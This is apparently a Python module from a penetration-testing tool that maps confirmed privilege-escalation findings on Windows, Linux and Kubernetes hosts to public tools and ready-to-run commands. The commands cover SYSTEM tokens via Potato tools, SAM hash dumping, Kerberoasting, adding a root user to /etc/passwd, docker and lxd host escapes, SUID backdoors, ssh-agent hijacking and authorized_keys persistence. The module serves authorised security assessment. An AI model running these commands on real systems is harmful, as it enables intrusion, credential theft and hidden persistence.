"""Per-finding exploitation playbook.

For a CONFIRMED privilege-escalation finding, map it to the exact EXISTING public
tool, the precise command (with the finding's own values - path / binary / service
- filled in), the prerequisites, and a validation step. This is the
"finding -> run this with vetted tooling" bridge: it points at published tools
(Metasploit, PowerUp, the Potato family, impacket, GTFOBins, gpp-decrypt, public
PoCs) and their documented usage. It does NOT generate exploit code.

Only confirmed findings get an entry - advisories / "potential" version matches
never get a "run this" line, exactly like the proven-exploit gating.
"""

from __future__ import annotations

import re

from .models import Host

# Each play:
#   match   - regex over "title + evidence" (lowercased) that selects the finding
#   os      - "windows" | "linux" | "" (any)
#   tool    - the existing public tool(s) to use
#   cmd     - the documented invocation; "{X}" is replaced by `extract` group 1
#   extract - optional regex over the ORIGINAL text; group(1) fills "{X}"
#   prereq  - what you need first
#   validate- how to confirm it worked
_PLAYS = [
    # ---- Windows ----
    {"id": "win-seimpersonate", "os": "windows",
     "match": r"seimpersonate|seassignprimarytoken|potato",
     "tool": "GodPotato / PrintSpoofer64 / JuicyPotatoNG (existing)",
     "cmd": 'GodPotato -cmd "cmd /c whoami"    (or: PrintSpoofer64.exe -i -c cmd)',
     "prereq": "code exec as a service/AppPool identity that holds SeImpersonate "
               "(IIS AppPool, MSSQL, many service accounts)",
     "validate": "whoami -> NT AUTHORITY\\SYSTEM"},
    {"id": "win-alwaysinstallelevated", "os": "windows",
     "match": r"alwaysinstallelevated",
     "tool": "PowerUp (Write-UserAddMSI) or msfvenom + msiexec (existing)",
     "cmd": "PowerUp> Write-UserAddMSI ; then run the produced .msi   "
            "(or msiexec /quiet /qn /i <msi-from-msfvenom>)",
     "prereq": "AlwaysInstallElevated = 1 in BOTH HKLM and HKCU",
     "validate": "the MSI action runs as SYSTEM (new local admin / SYSTEM shell)"},
    {"id": "win-unquoted", "os": "windows",
     "match": r"unquoted service path",
     "extract": r"(<?[A-Za-z]:\\[^\r\n]+?\.exe>?)",
     "tool": "msfvenom service payload + service restart (existing)",
     "cmd": "drop a service-exe payload at the first writable space-separated "
            "segment of {X}, then: sc stop <svc> & sc start <svc>",
     "prereq": "write access to a path segment before a space in {X}; rights to "
               "restart the service (or a reboot)",
     "validate": "the service launches your binary as its (often SYSTEM) account"},
    {"id": "win-writable-service", "os": "windows",
     # Windows-specific phrasing only, so it never collides with a Linux
     # "writable service unit" (systemd) finding.
     "match": r"weak service (permission|acl)|can (modify|reconfigure) (the )?service|"
              r"writable service binary( path)?|service binary is writable",
     "tool": "sc / PowerUp Invoke-ServiceAbuse (existing)",
     "cmd": "sc config <svc> binPath= \"<your-payload.exe>\" ; sc stop <svc> & sc start <svc>"
            "    (or PowerUp> Invoke-ServiceAbuse -Name <svc>)",
     "prereq": "write/reconfigure rights on the service and rights to restart it",
     "validate": "the service runs your binary as its service account"},
    {"id": "win-dll-hijack", "os": "windows",
     "match": r"dll hijack|writable directory in (system|user) path|writable app dir|"
              r"service binary directory is writable",
     "extract": r"((?:[A-Za-z]:\\[^\r\n]+?|PATHdir:|AppDir:|SvcDir:)[^\r\n]*)",
     "tool": "ProcMon + msfvenom (existing)",
     "cmd": "ProcMon -> filter Result=NAME NOT FOUND & Path ends .dll for the target; "
            "msfvenom -f dll -o <MissingDll>.dll; drop it in the writable dir; "
            "start/restart the exe/service",
     "prereq": "the writable directory + target exe/service named in the finding",
     "validate": "your DLL loads in the (often SYSTEM) process"},
    {"id": "win-sebackup", "os": "windows",
     "match": r"sebackup|serestore|setakeownership",
     "tool": "reg save + impacket-secretsdump (existing)",
     "cmd": "reg save hklm\\sam sam & reg save hklm\\system system   ->   "
            "impacket-secretsdump -sam sam -system system LOCAL",
     "prereq": "a shell holding SeBackupPrivilege/SeRestorePrivilege",
     "validate": "local account NT hashes dumped (crack or pass-the-hash)"},
    {"id": "win-gpp-cpassword", "os": "windows",
     "match": r"cpassword|gpp password",
     "extract": r"cpassword[\"'=:\s]+([A-Za-z0-9+/=]{16,})",
     "tool": "gpp-decrypt (existing)",
     "cmd": "gpp-decrypt {X}     (the cpassword blob from a SYSVOL Groups.xml)",
     "prereq": "the cpassword string from a SYSVOL Group Policy Preferences file",
     "validate": "decrypts to a cleartext domain credential"},
    {"id": "win-stored-cred", "os": "windows",
     "match": r"stored/cleartext credential|autologon.*password|cleartext credential",
     "tool": "netexec / impacket (existing)",
     "cmd": "netexec smb <targets> -u <user> -p <recovered-pass>   "
            "(validate + spray the recovered credential)",
     "prereq": "a recovered credential",
     "validate": "authenticates somewhere (ideally granting local admin)"},
    {"id": "win-kerberoast", "os": "windows",
     "match": r"kerberoast",
     "tool": "impacket-GetUserSPNs / Rubeus (existing)",
     "cmd": "impacket-GetUserSPNs <dom>/<user>:<pass> -request   (or Rubeus.exe "
            "kerberoast /nowrap)  ->  hashcat -m 13100",
     "prereq": "any valid domain account (the SPN accounts are listed)",
     "validate": "a cracked service-account password"},
    {"id": "win-asrep", "os": "windows",
     "match": r"as-rep roastable",
     "tool": "impacket-GetNPUsers / Rubeus (existing)",
     "cmd": "impacket-GetNPUsers <dom>/ -usersfile users.txt -no-pass  ->  "
            "hashcat -m 18200",
     "prereq": "the account list (shown); no creds needed for AS-REP",
     "validate": "a cracked account password"},
    {"id": "win-delegation", "os": "windows",
     "match": r"unconstrained-delegation",
     "tool": "Rubeus + a coercion tool (PetitPotam/printerbug) (existing)",
     "cmd": "Rubeus.exe monitor /interval:5  then coerce a DC to auth to the "
            "delegation host; extract + pass the captured TGT",
     "prereq": "local admin on the unconstrained-delegation host",
     "validate": "a DC TGT -> DCSync / domain admin"},
    {"id": "win-winrm-lateral", "os": "windows",
     "match": r"winrm running|winrm reachable",
     "tool": "netexec / Enter-PSSession (existing)",
     "cmd": "netexec winrm <ip> -u <user> -p <pass> (or -H <hash>) -x whoami",
     "prereq": "a credential/hash valid on the target",
     "validate": "remote command output as that user"},
    # ---- Linux ----
    {"id": "lin-sudo", "os": "linux",
     "match": r"nopasswd|sudo grants \(all\)|sudo .*privilege escalation",
     "tool": "GTFOBins",
     "cmd": "sudo -l  ->  run the allowed binary per its GTFOBins entry "
            "(e.g. sudo find . -exec /bin/sh \\; )",
     "prereq": "a sudo entry runnable without a password (or a known password)",
     "validate": "id -> uid=0(root)"},
    {"id": "lin-suid", "os": "linux",
     "match": r"suid .*gtfobins|gtfobins escalation|suid /",
     "extract": r"suid (/\S+)",
     "tool": "GTFOBins",
     "cmd": "use {X} per its GTFOBins SUID entry "
            "(e.g. {X} ...  -exec /bin/sh -p \\; )",
     "prereq": "the SUID bit on {X} and a GTFOBins technique for it",
     "validate": "euid-0 shell (id shows euid=0)"},
    {"id": "lin-writable-passwd", "os": "linux",
     "match": r"/etc/passwd is writable|writable /etc/passwd",
     "tool": "openssl (built-in)",
     "cmd": "openssl passwd -1 -salt x Pass123  ->  echo "
            "'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd  ->  su r00t",
     "prereq": "write access to /etc/passwd",
     "validate": "su to the new UID-0 account -> root"},
    {"id": "lin-readable-shadow", "os": "linux",
     "match": r"/etc/shadow is readable|readable /etc/shadow",
     "tool": "john / hashcat (existing)",
     "cmd": "unshadow /etc/passwd /etc/shadow > h && john h",
     "prereq": "read access to /etc/shadow",
     "validate": "a cracked password for a privileged account"},
    {"id": "lin-docker", "os": "linux",
     "match": r"docker\.sock|docker group|in the 'docker' group|docker access",
     "tool": "docker client (existing)",
     "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
     "prereq": "membership in the docker group or a writable /var/run/docker.sock",
     "validate": "root shell in the host mount (id -> uid=0)"},
    {"id": "lin-lxd", "os": "linux",
     "match": r"lxd/lxc group|lxd group|lxc group",
     "tool": "lxd/lxc client + a distrobuilder Alpine image (existing)",
     "cmd": "import a small Alpine image, launch a privileged container with "
            "security.privileged=true and the host / mounted, then chroot in "
            "(the documented lxd-privesc path)",
     "prereq": "membership in the lxd/lxc group",
     "validate": "root shell over the host filesystem mount"},
    {"id": "lin-pwnkit", "os": "linux",
     "match": r"pwnkit|cve-2021-4034",
     "tool": "public PwnKit PoC / Metasploit local exploit (existing)",
     "cmd": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec   "
            "(or the ly4k/PwnKit static binary)",
     "prereq": "vulnerable polkit/pkexec (pre Jan-2022)",
     "validate": "root shell"},
    {"id": "lin-dirtypipe", "os": "linux",
     "match": r"dirty pipe|cve-2022-0847",
     "tool": "public Dirty Pipe PoC (existing)",
     "cmd": "run the public CVE-2022-0847 PoC (e.g. Exploit-DB 50808) to overwrite "
            "a root-owned file (/etc/passwd or a SUID binary)",
     "prereq": "kernel 5.8-5.16.11 (unpatched)",
     "validate": "root shell / overwritten root-owned file"},
    {"id": "lin-writable-cron", "os": "linux",
     "match": r"writable cron|writable .*timer|world/.*writable cron|writable service unit",
     "extract": r"(/\S+)",
     "tool": "built-in shell",
     "cmd": "append to {X}:  cp /bin/bash /tmp/b; chmod +s /tmp/b   "
            "(wait for the schedule) then: /tmp/b -p",
     "prereq": "write access to {X} and it runs as root on a schedule",
     "validate": "SUID /tmp/b -p -> euid 0"},
    {"id": "lin-ld-preload", "os": "linux",
     "match": r"ld_preload",
     "tool": "standard LD_PRELOAD .so technique (see recce-enum.sh how-to)",
     "cmd": "build the standard preload .so, then: sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>",
     "prereq": "env_keep+=LD_PRELOAD in sudoers and a sudo command you can run",
     "validate": "root shell from the preloaded library"},
    {"id": "lin-ssh-agent", "os": "linux",
     "match": r"ssh-agent socket live",
     "extract": r"\((/[^)]+)\)",
     "tool": "openssh client (existing)",
     "cmd": "SSH_AUTH_SOCK={X} ssh-add -l  ->  SSH_AUTH_SOCK={X} ssh <user>@<known-host>",
     "prereq": "a live ssh-agent socket for this user (keys held in memory)",
     "validate": "a shell on another host without reading the private key"},
    {"id": "lin-restricted-shell", "os": "linux",
     "match": r"restricted shell",
     "tool": "GTFOBins (existing techniques)",
     "cmd": "escape via an allowed interpreter: vim ':set shell=/bin/bash|:shell', "
            "awk 'BEGIN{system(\"/bin/bash\")}', or export PATH/SHELL",
     "prereq": "a restricted shell (rbash/lshell) with at least one allowed interpreter",
     "validate": "an unrestricted prompt (echo $- shows no 'r')"},
    {"id": "lin-k8s", "os": "linux",
     "match": r"kubernetes service-account token|kubeconfig readable",
     "tool": "kubectl (existing)",
     "cmd": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) "
            "auth can-i --list   (or KUBECONFIG=<file> kubectl get secrets -A)",
     "prereq": "a readable service-account token or kubeconfig",
     "validate": "authorised cluster API actions (read secrets / exec pods)"},
    {"id": "lin-suid-pathhijack", "os": "linux",
     "match": r"suid path-hijack",
     "extract": r"\[([a-z0-9 -]+)\]",
     "tool": "built-in shell (PATH hijack)",
     "cmd": "for one of [{X}]: echo '/bin/bash -p' >/tmp/<cmd>; chmod +x /tmp/<cmd>; "
            "PATH=/tmp:$PATH <suid-bin>",
     "prereq": "a custom SUID binary that invokes a command by bare name (found by "
               "the static analysis)",
     "validate": "id -> euid=0(root)"},
    {"id": "lin-writable-hook", "os": "linux",
     "match": r"writable login-time|writable ~/.ssh/authorized_keys",
     "extract": r"(/\S+|~/\S+)",
     "tool": "built-in shell",
     "cmd": "append to {X}: your command runs when the triggering user logs in "
            "(authorized_keys -> add a key for re-entry)",
     "prereq": "write access to {X} and a (privileged) user who triggers it",
     "validate": "code exec as the triggering user / silent re-entry"},
]

_COMPILED = [(re.compile(p["match"], re.I), p) for p in _PLAYS]


def _os_of(host: Host) -> str:
    blob = f"{host.os_family} {host.os_name}".lower()
    if "windows" in blob:
        return "windows"
    if "linux" in blob or "unix" in blob:
        return "linux"
    return ""


def for_text(text: str, os_family: str = "") -> dict | None:
    """Return {tool, cmd, prereq, validate, id} for the first play that matches
    this finding text, or None. `os_family` disambiguates OS-specific plays."""
    if not text:
        return None
    low = text.lower()
    host_os = (os_family or "").lower()
    for rx, p in _COMPILED:
        if p["os"] and host_os and p["os"] not in host_os:
            continue
        if not rx.search(low):
            continue
        cmd, prereq = p["cmd"], p["prereq"]
        if p.get("extract"):
            em = re.search(p["extract"], text, re.I)
            val = em.group(1).strip() if em else "<target>"
            cmd = cmd.replace("{X}", val)
            prereq = prereq.replace("{X}", val)
        return {"id": p["id"], "tool": p["tool"], "cmd": cmd,
                "prereq": prereq, "validate": p["validate"]}
    return None


def host_entries(host: Host) -> list[dict]:
    """Per-host exploitation entries for CONFIRMED privesc findings only. Each:
    {ip, hostname, finding, tool, cmd, prereq, validate, key}. Deduped by
    (play id) so one host doesn't repeat the same technique."""
    os_family = _os_of(host)
    out: list[dict] = []
    seen: set[str] = set()

    def add(finding_text, label):
        entry = for_text(finding_text, os_family)
        if not entry or entry["id"] in seen:
            return
        seen.add(entry["id"])
        out.append({
            "ip": host.ip, "hostname": host.hostname, "finding": label,
            "tool": entry["tool"], "cmd": entry["cmd"],
            "prereq": entry["prereq"], "validate": entry["validate"],
            "key": f"exploit:{host.ip}:{entry['id']}"})

    # Findings above the QoD visibility floor (skip advisories / low-confidence version
    # matches). Single QoD authority; was a bespoke `confidence == "potential"` skip.
    from . import qod
    for v in host.vulns:
        if not qod.is_visible(v):
            continue
        add(f"{v.title} {v.output}", v.title or v.script_id or "finding")
    # On-target ingested findings (all confirmed local observations).
    for f in getattr(host, "local_findings", []) or []:
        vec = f.get("vector", "")
        add(vec, vec[:80])
    return out


def all_entries(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        out.extend(host_entries(h))
    return out
